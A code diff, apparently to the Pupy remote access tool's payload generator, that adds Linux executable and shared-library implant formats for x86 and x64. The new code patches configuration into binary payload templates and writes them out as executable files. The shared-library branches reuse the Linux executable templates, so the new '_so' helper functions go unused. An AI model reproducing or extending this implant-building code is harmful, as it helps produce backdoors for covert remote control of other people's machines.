@@ -33,6 +33,18 @@ def get_edit_pupyx86_exe(conf):
 def get_edit_pupyx64_exe(conf):
     return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.exe"), conf)
 
+def get_edit_pupyx86_lin(conf):
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.lin"), conf)
+
+def get_edit_pupyx64_lin(conf):
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.lin"), conf)
+
+def get_edit_pupyx86_so(conf):
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx86.so"), conf)
+
+def get_edit_pupyx64_so(conf):
+    return get_edit_binary(os.path.join(ROOT, "payload_templates","pupyx64.so"), conf)
+
 def get_edit_binary(path, conf):
     logging.debug("generating binary %s with conf: %s"%(path, conf))
     binary=b""
@@ -268,7 +280,7 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner','rubber_ducky']
+PAYLOAD_FORMATS=['apk', 'lin_x86', 'lin_x64', 'so_x86', 'so_x64', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky']
 if __name__=="__main__":
     parser = argparse.ArgumentParser(description='Generate payloads for windows, linux, osx and android.')
     parser.add_argument('-f', '--format', default='exe_x86', choices=PAYLOAD_FORMATS, help="(default: exe_x86)")
@@ -322,6 +334,34 @@ if __name__=="__main__":
             outpath="pupyx86.exe"
         with open(outpath, 'wb') as w:
             w.write(binary)
+    elif args.format=="lin_x86":
+        binary=get_edit_pupyx86_lin(conf)
+        if not outpath:
+            outpath="pupyx86.lin"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+        os.chmod(outpath, 0711)
+    elif args.format=="so_x86":
+        binary=get_edit_pupyx86_lin(conf)
+        if not outpath:
+            outpath="pupyx86.so"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+        os.chmod(outpath, 0711)
+    elif args.format=="lin_x64":
+        binary=get_edit_pupyx64_lin(conf)
+        if not outpath:
+            outpath="pupyx64.lin"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+        os.chmod(outpath, 0711)
+    elif args.format=="so_x64":
+        binary=get_edit_pupyx64_lin(conf)
+        if not outpath:
+            outpath="pupyx64.so"
+        with open(outpath, 'wb') as w:
+            w.write(binary)
+        os.chmod(outpath, 0711)
     elif args.format=="exe_x64":
         binary=get_edit_pupyx64_exe(conf)
         if not outpath:
@@ -404,4 +444,3 @@ if __name__=="__main__":
     print("LAUNCHER = %s"%repr(args.launcher))
     print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
     print("SCRIPTLETS = %s"%args.scriptlet)
-
